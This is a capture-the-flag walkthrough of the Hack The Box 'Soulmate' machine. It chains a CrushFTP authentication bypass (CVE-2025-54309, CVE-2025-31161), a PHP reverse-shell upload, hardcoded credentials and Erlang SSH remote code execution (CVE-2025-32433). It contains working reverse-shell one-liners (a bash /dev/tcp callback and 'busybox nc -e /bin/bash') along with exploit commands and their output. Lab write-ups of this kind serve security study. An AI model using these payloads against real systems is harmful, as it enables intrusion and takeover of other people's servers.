---
title: Soulmate [Easy]
date: 2025-09-12
tags: [htb, linux, nmap, lfi, dirsearch, cve-2025-54309, gobuster, cve-2025-31161/cve-2025-2825, php reverse shell, erlang, cve-2025-32433, hardcoded credentials]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/soulmate-htb-release-area-machine
image: /assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_banner.png
---

# Soulmate HTB Release Area Machine
## Machine information
Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.172.38                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 10:56 EDT
Nmap scan report for 10.129.172.38
Host is up (0.60s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.60 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.172.38     soulmate.htb
```

Let's check the web server.

### Web Enumeration
Go to `http://soulmate.htb`.

![Soulmate Website](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website.png)

So this website is about finding your perfect match :D. <br>
Let's scanning first if we can find some endpoints and have some basic overview of this website.

```bash
└─$ dirsearch -u http://soulmate.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB_Labs/Release_Arena_Machine/Soulmate/reports/http_soulmate.htb/__25-09-07_11-29-34.txt

Target: http://soulmate.htb/

[11:29:34] Starting: 
[11:30:16] 403 -  564B  - /assets/                                          
[11:30:16] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/          
[11:30:27] 302 -    0B  - /dashboard.php  ->  /login                        
[11:30:46] 200 -    8KB - /login.php                                        
[11:30:47] 302 -    0B  - /logout.php  ->  login.php                        
[11:31:04] 302 -    0B  - /profile.php  ->  /login                          
[11:31:07] 200 -   11KB - /register.php                                     
                                                                             
Task Completed
```

It got register, login and even profile and dashboard. <br>
&rarr; Let's register with new user.

![Soulmate Website Register](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-register.png)

Looking at the `register.php`, we can see that there is upload function where we can upload our photo but this one is optional but we will go for it and capture with our burpsuit.

![Soulmate Website Register and Upload Photo](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-register-and-upload-photo.png)

![Soulmate Website Register and Upload Photo Burp Request](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-register-and-upload-photo-burp-request.png)

Now let's login.

![Soulmate Website Login](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-login.png)

![Soulmate Website Profile](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-profile.png)

So we are in the `profile.php` and there is nothing much we can do then leverage the upload `Profile Picture` function.

![Soulmate Website Refresh](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-refresh.png)

But after goind around and back to the profile page, the profile picture disappear and our information for register gone. <br>
Also we can see the memeber is marked since `Jan 1970`, that date I was not born yet :)))).

So we gonna try to use this upload function to rce so that we can have some initial footage inside to go furthere more.

### LFI to RCE
We are using this methodologies from [file-upload](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/file-upload) to see if we can rce this website.

![Soulmate Website Profile Upload New Picture](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-profile-upload-new-picture.png)

After upload the `shell.gif` then open the image in new tab and add `&cmd=id` to see if we can got the response.

![Soulmate Website Profile Shell](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-profile-shell.png)

So we got `404 Not Found` and we can see that the name of the file has been changed to some random number so we can not exploit this way. <br>
&rarr; We need to find other way so we back to recon and start subdomain finding.

### Subdomain Fuzzing & Discovery
We gonna do it with [gobuster](https://github.com/OJ/gobuster).

```bash
└─$ gobuster vhost -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://soulmate.htb/
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
Progress: 653920 / 653921 (100.00%)
===============================================================
Finished
===============================================================
```

After waiting, we found out another subdomain `ftp`. <br>
&rarr; Add it to `/etc/hosts`.

```bash
10.129.172.38     soulmate.htb ftp.soulmate.htb
```

Go to `http://ftp.soulmate.htb`.

![Soulmate Website FTP](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-FTP.png)

So we got redirected to `http://ftp.soulmate.htb/WebInterface/login.html` and it named as `CrushFTP`. <br>
Since we do not have any credentials yet so we gonna search for related cve or public exploit based on the name. <br>
But the things is we need to know the version cause searching `CrushFTP` is huge. <br>
&rarr; Let's view page source if we can seek for some version info.

![Soulmate Website FTP View Source](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-FTP-view-source.png)

At the bottom, we found this `/WebInterface/new-ui/sw.js?v=11.W.657-2025_03_08_07_52` which it could be the version of the current `CrushFTP` is using which is `11.W.657`. <br>
&rarr; Let's searching out for cve or related exploit.

After a while, we found like some cve that we can use and modified for our target which are [CVE-2025-54309](https://nvd.nist.gov/vuln/detail/CVE-2025-54309), [CVE-2025-31161](https://nvd.nist.gov/vuln/detail/CVE-2025-31161) and [CVE-2025-2825](https://nvd.nist.gov/vuln/detail/CVE-2025-2825). <br>
But it seems like the `CVE-2025-2825` is marked as rejected cause it was replicated as `CVE-2025-31161` so we only got two valid cve left. <br>
&rarr; Let's go with the [CVE-2025-54309](https://nvd.nist.gov/vuln/detail/CVE-2025-54309).

### CVE-2025-54309
We found out this article talking about zero day in crushftp which is wild [crushftp-zero-day-exploited-in-the-wild](https://www.rapid7.com/blog/post/crushftp-zero-day-exploited-in-the-wild/) and that was just few month ago only. <br>
From this [CompromiseJuly2025](https://www.crushftp.com/crush11wiki/Wiki.jsp?page=CompromiseJuly2025) advisory and [GHSA-rh5q-v9ww-rqgm](https://github.com/advisories/GHSA-rh5q-v9ww-rqgm) to see the description of the vulnerabilities. <br>
&rarr; To understand more about this cve, we found this [the-one-where-we-just-steal-the-vulnerabilities-crushftp-cve-2025-54309](https://labs.watchtowr.com/the-one-where-we-just-steal-the-vulnerabilities-crushftp-cve-2025-54309/) where we can briefly go through how it got exploited and how it working out. This one also provide [watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309](https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309) so we gonna use this to exploit our target.

```bash
└─$ python3 watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.soulmate.htb                        
/home/kali/HTB_Labs/Release_Arena_Machine/Soulmate/watchTowr-vs-CrushFTP-CVE-2025-54309.py:59: SyntaxWarning: invalid escape sequence '\c'
  "AS2-TO": "\crushadmin",
[*] Generated new c2f value: YuwM
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-CrushFTP-CVE-2025-54309.py
        (*) CrushFTP Authentication Bypass Race Condition PoC
        
          - Sonny , watchTowr (sonny@watchTowr.com)

        CVEs: [CVE-2025-54309]
        
[*] CRUSHFTP RACE CONDITION POC
[*] TARGET: http://ftp.soulmate.htb
[*] ENDPOINT: CrushFTP WebInterface getUserList
[*] ATTACK: 5000 requests with new c2f every 50 requests
============================================================
Starting race with 5000 request pairs...
============================================================
[*] Generated new c2f value: UtmL
[*] NEW SESSION: c2f=UtmL
[*] PROGRESS: 50/5000 request pairs completed...
[*] Generated new c2f value: Vy6w
[*] NEW SESSION: c2f=Vy6w
[*] PROGRESS: 100/5000 request pairs completed...
[*] Generated new c2f value: rujb
[*] NEW SESSION: c2f=rujb
[*] PROGRESS: 150/5000 request pairs completed...
[*] Generated new c2f value: SzDm
[*] NEW SESSION: c2f=SzDm
[*] PROGRESS: 200/5000 request pairs completed...
[*] Generated new c2f value: 3aCk
[*] NEW SESSION: c2f=3aCk
[*] PROGRESS: 250/5000 request pairs completed...
[*] Generated new c2f value: abom
[*] NEW SESSION: c2f=abom
[*] PROGRESS: 300/5000 request pairs completed...
[*] Generated new c2f value: V1r0
[*] NEW SESSION: c2f=V1r0
[*] PROGRESS: 350/5000 request pairs completed...
[*] Generated new c2f value: Cyqd
[*] NEW SESSION: c2f=Cyqd
[*] PROGRESS: 400/5000 request pairs completed...
[*] Generated new c2f value: oOEc
[*] NEW SESSION: c2f=oOEc
[*] PROGRESS: 450/5000 request pairs completed...
[*] Generated new c2f value: K1mE
[*] NEW SESSION: c2f=K1mE
[*] PROGRESS: 500/5000 request pairs completed...
[*] Generated new c2f value: DP9l
[*] NEW SESSION: c2f=DP9l
[*] PROGRESS: 550/5000 request pairs completed...
[*] Generated new c2f value: GiZ8
[*] NEW SESSION: c2f=GiZ8
[*] PROGRESS: 600/5000 request pairs completed...
[*] Generated new c2f value: tgjC
[*] NEW SESSION: c2f=tgjC
[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
[*] VULNERABLE! RACE CONDITION POSSIBLE!
```

So this one got vulnerable and we know that this cve is about `CrushFTP Authentication Bypass Race Condition` so as the attacker can bypass the authentication via race condition to exfiltrated some users that we got from the output. <br>
Here is the things, we got to know that those users are available in `ftp.soulmate.htb` but how can we login like there is not password and this script just only list users only. <br>
&rarr; After searching more, we found out another one [CVE-2025-3116](https://github.com/Immersive-Labs-Sec/CVE-2025-3116) from [Immersive-Labs-Sec](https://github.com/Immersive-Labs-Sec) giving a poc that can exploit and able to create a new user with admin privileges and it also mention [CVE-2025-2825](https://nvd.nist.gov/vuln/detail/CVE-2025-2825) and also found out [CVE-2025-2825-CrushFTP-AuthBypass](https://github.com/Shivshantp/CVE-2025-2825-CrushFTP-AuthBypass) another poc for exploit and to understand more, we can check out this [crushftp-authentication-bypass](https://projectdiscovery.io/blog/crushftp-authentication-bypass).

We will go with [CVE-2025-3116](https://github.com/Immersive-Labs-Sec/CVE-2025-3116) this one.

### CVE-2025-31161/CVE-2025-2825
So we gonna target user `ben` and then create new user `2fa0n`.

```bash
└─$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user ben --new_user 2fa0n --password 2fa0n
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: 2fa0n
   [*] Password: 2fa0n.
```

Let's login with our new user to see if it works.

![Soulmate Website CrushFTP CVE-2025-31161](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-cve-2025-31161.png)

We are in and notice on the top left side corner, there is `Admin` which means that we have admin permissions level, let's check it out.

![Soulmate Website CrushFTP Admin](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-admin.png)

Okay, we are in the admin dashboard, going through some stuffs and found out `User Manager` quite interesting.

![Soulmate Website CrushFTP Admin User Manager](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-admin-user-manager.png)

So we are able to control these users, the things is we can also change these users password. <br>
Sounds fun here through. Let's target to change `ben` password and then login again with this user.

![Soulmate Website CrushFTP Change ben Password](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-change-ben-password.png)

![Soulmate Website CrushFTP Popup Password](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-popup-password.png)

After changing, there will be popup for new password has been changed. <br>
&rarr; Save it and login back as `ben`.

```bash
Username : ben Password : XUZ77m
```

![Soulmate Website CrushFTP ben](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-ben.png)

We are in `ben` session now, here we go!

And we got some more stuffs appear like `webProd`, `IT` and `ben` directory but seems like we can not grab the `user.txt` flag but we can download all the stuffs and checking it.

![Soulmate Website CrushFTP ben folders](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-ben-folders.png)

Seems like nothing much to do with these stuffs, but then when we click the `webProd` directory.

![Soulmate Website CrushFTP ben webProd folder](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-ben-webProd-folder.png)

We found out there is `Upload` button where we can upload file into it. Same with `ben` directory as well. <br>
&rarr; So we gonna leverage this point to upload a reverse shell and setup our listener to catch it.

### PHP Reverse Shell
We gonna craft a simple php file to execute bash shell command.

```php
# soul.php  
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/3333 0>&1'"); ?>
```

Then we upload it.

![Soulmate Website CrushFTP ben upload](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-crushftp-ben-upload.png)

Setup our listener.

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

From the upload path, we can see that it was `/webProd/soul.php` which means it only the main website `soulmate.htb`. <br>
&rarr; Let's check it out `http://soulmate.htb/soul.php`.

![Soulmate Website Reverse Shell](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-reverse-shell.png)

```bash
└─$ penelope -p 3333
[+] Listening for reverse shells on 0.0.0.0:3333 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from soulmate~10.129.172.38-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/soulmate~10.129.172.38-Linux-x86_64/2025_09_08-06_08_05-393.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@soulmate:~/soulmate.htb/public$
```

There we go, got into our shell as `www-data`. But our goal is `ben` so we can escalated more to `root`. <br>
&rarr; Let's recon around to see if we can find any usefull informations.

```bash
www-data@soulmate:~/soulmate.htb/config$ cat config.php
<?php
class Database {
    private $db_file = '../data/soulmate.db';
    private $pdo;

    public function __construct() {
        $this->connect();
        $this->createTables();
    }

    private function connect() {
        try {
            // Create data directory if it doesn't exist
            $dataDir = dirname($this->db_file);
            if (!is_dir($dataDir)) {
                mkdir($dataDir, 0755, true);
            }

            $this->pdo = new PDO('sqlite:' . $this->db_file);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    private function createTables() {
        $sql = "
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

        $this->pdo->exec($sql);

        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);
        
        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}

// Helper functions
function redirect($path) {
    header("Location: $path");
    exit();
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function requireLogin() {
    if (!isLoggedIn()) {
        redirect('/login');
    }
}

function requireAdmin() {
    requireLogin();
    if (!isAdmin()) {
        redirect('/profile');
    }
}
?>
```

We found out a `config.php` that contains the password for admin &rarr; `Crush4dmin990`. <br>
&rarr; Let's login it and see what else can we do.

![Soulmate Website Admin Login](/assets/img/soulmate-htb-release-area-machine/soulmate-htb-release-area-machine_website-admin-login.png)

Seems like there is nothing to do from admin so we gonna keep recon.

```bash
www-data@soulmate:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:39417         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1195/nginx: worker  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34203         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1195/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:4369                :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

There is port `2222` which is non-standard port which can config and the `22` is the standard port. <br>
Some port is weird and searching out and know that `4369` is used by EPMD (Erlang Port Mapper Daemon) which is a peer discovery service used by RabbitMQ nodes and CLI tools. <br>
&rarr; So we have more information that this one use some non-standart port `2222` and using `Erlang`, let's recon more if we can find something related to these.

### Erlang

```bash
www-data@soulmate:/usr/local/lib$ ls -la
total 20
drwxr-xr-x  5 root root 4096 Aug 14 14:12 .
drwxr-xr-x 10 root root 4096 Feb 17  2023 ..
drwxr-xr-x  8 root root 4096 Aug  6 10:44 erlang
drwxr-xr-x  2 root root 4096 Aug 15 07:46 erlang_login
drwxr-xr-x  3 root root 4096 Feb 17  2023 python3.10
```

Found out there is `Erlang` application so there maybe chance the `2222` is custom Erlang-based authentication service or like SSH service with Erlang integration. <br>
&rarr; Let's testing the connection.

```bash
www-data@soulmate:/usr/local/bin$ telnet 127.0.0.1 2222
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
SSH-2.0-Erlang/5.2.9
```

So we got `SSH-2.0-Erlang/5.2.9` which is SSH Service run on port `2222` and the special thing is that it was implemented by `Erlang`. <br>
&rarr; Checking out `/erlang_login`.

```bash
www-data@soulmate:/usr/local/lib/erlang_login$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Aug 15 07:46 .
drwxr-xr-x 5 root root 4096 Aug 14 14:12 ..
-rwxr-xr-x 1 root root 1570 Aug 14 14:12 login.escript
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 start.escript
```

There are 2 scripts that one of them may contain credentials.

```bash
www-data@soulmate:/usr/local/lib/erlang_login$ cat login.escript
#!/usr/bin/env escript
%%! -noshell

main(_) ->
    %% Start required OTP apps safely
    start_app(crypto),
    start_app(asn1),
    start_app(public_key),
    start_app(ssh),

    %% Fetch environment vars safely
    User = safe_env("USER"),
    Conn = safe_env("SSH_CONNECTION"),
    Tty  = safe_env("SSH_TTY"),
    Host = safe_env("HOSTNAME"),

    %% Build log line
    LogLine = io_lib:format("login user=~s from=~s tty=~s host=~s~n",
                            [User, Conn, Tty, Host]),

    %% Log to syslog
    os:cmd("logger -t erlang_login " ++ lists:flatten(LogLine)),

    %% Log to a flat file
    ensure_logdir(),
    file:write_file("/var/log/erlang_login/session.log",
                    LogLine,
                    [append]),

    %% Exit cleanly
    halt(0).

%% Utility to start app if not already running
start_app(App) ->
    Apps = application:which_applications(),
    case lists:keyfind(App, 1, Apps) of
        false ->
            case application:start(App) of
                ok -> ok;
                {error, {already_started, _}} -> ok;
                {error, Reason} ->
                    io:format("Warning: cannot start ~p: ~p~n", [App, Reason])
            end;
        _ -> ok
    end.

safe_env(Var) ->
    case os:getenv(Var) of
        false -> "unknown";
        Val when is_list(Val) -> Val;
        Val when is_binary(Val) -> binary_to_list(Val)
    end.

ensure_logdir() ->
    case file:read_file_info("/var/log/erlang_login") of
        {ok,_} -> ok;
        _ -> file:make_dir("/var/log/erlang_login")
    end,
    ok.
```

```bash
www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

**JACKPOT!** We found a hardcoded credentials in `start.escript`.

```bash
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

Let's `ssh` with normal port first.

```bash
└─$ ssh ben@10.129.127.216
ben@10.129.127.216's password: 
Last login: Tue Sep 9 03:40:53 2025 from 10.10.16.17
ben@soulmate:~$
```

```bash
ben@soulmate:~$ ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Sep  2 10:27 .
drwxr-xr-x 3 root root 4096 Sep  2 10:27 ..
lrwxrwxrwx 1 root root    9 Aug 27 09:28 .bash_history -> /dev/null
-rw-r--r-- 1 ben  ben   220 Aug  6 10:17 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Aug  6 10:17 .bashrc
drwx------ 2 ben  ben  4096 Sep  2 10:27 .cache
-rw-r--r-- 1 ben  ben   807 Aug  6 10:17 .profile
-rw-r----- 1 root ben    33 Sep  9 03:24 user.txt
ben@soulmate:~$ cat user.txt
2a292f69fd92952b38af8ec0f6415878
```

Grab our `user.txt` flag.

## Initial Access
So we are in `ben` and discovery out some recon.

### Discovery
```bash
ben@soulmate:~$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on soulmate.
```

So our user does not have permissions to run `sudo`. <br>
&rarr; Let's back to `www-data` session or we can ssh with port `2222` in `ben` session to see what happen.

```bash
www-data@soulmate:/usr/local/lib/erlang_login$ ssh ben@localhost -p 2222
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

We are in `Eshell` so to use the command, we can check out by typing `help().` <br>
&rarr; Let's searching out for public cve or related exploitation.

From this [SSH Release Notes](https://www.erlang.org/doc/apps/ssh/notes.html#ssh-5-2-10), we found out [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433) by exploiting a flaw in SSH protocol message handling that have attacker gain RCE.

### CVE-2025-32433
Checking out the advisory related [Unauthenticated Remote Code Execution in Erlang/OTP SSH](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2) and we also found out blog [rce-vulnerability-erlang-otp](https://www.cybereason.com/blog/rce-vulnerability-erlang-otp) that we can have a look at it. <br>
We searching more and got [CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC) and if we want to know more about how this Poc establish, we can go through [CVE-2025-32433-poc](https://platformsecurity.com/blog/CVE-2025-32433-poc) blog. <br>
&rarr; Let's exploit it out.

First we gonna download the python script and setup our python server and then transfer it to target machine via `wget`. <br>
Then we will escalated with these command and option.

```bash
www-data@soulmate:/tmp$ python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.16.17 --lport 4444
[*] Target: 127.0.0.1:2222
[*] Sending reverse shell to connect back to 10.10.16.17:4444
[*] Connecting to target...
[+] Received banner: SSH-2.0-Erlang/5.2.9
Fɍ      >\      5curve25519-sha256,curve25519-sha256@libssh.org,curve448-sha512,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com9ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256aes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbcaes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1▒none,zlib@openssh.com,zlib▒none,zlib@openssh.com,zlib
[+] Running command: os:cmd("bash -c 'exec 5<>/dev/tcp/10.10.16.17/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").
[✓] Exploit sent. If vulnerable, command should execute.
[+] Reverse shell command sent. Check your listener.
```

Checking back the listener does not have any response. <br>
&rarr; So we modified the command abit.

## Privilege Escalation
We gonna update this part.

```bash
[+] Running command: os:cmd("bash -c 'exec 5<>/dev/tcp/10.10.16.17/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'").
```

By using [busybox](https://gtfobins.github.io/gtfobins/busybox/) as this binary is not always restricted by other binary.

```bash
os:cmd("busybox nc 10.10.16.17 4444 -e /bin/bash")
```

### CVE-2025-32433 (modified script)
```bash
www-data@soulmate:/tmp$ python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.16.17 --lport 4444
[*] Target: 127.0.0.1:2222
[*] Sending reverse shell to connect back to 10.10.16.17:4444
[*] Connecting to target...
[+] Received banner: SSH-2.0-Erlang/5.2.9
[+] Running command: os:cmd("busybox nc 10.10.16.17 4444 -e /bin/bash").
[✓] Exploit sent. If vulnerable, command should execute.
[+] Reverse shell command sent. Check your listener.
```

```bash
└─$ penelope -p 4444         
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.16.17
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from soulmate~10.129.172.38-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
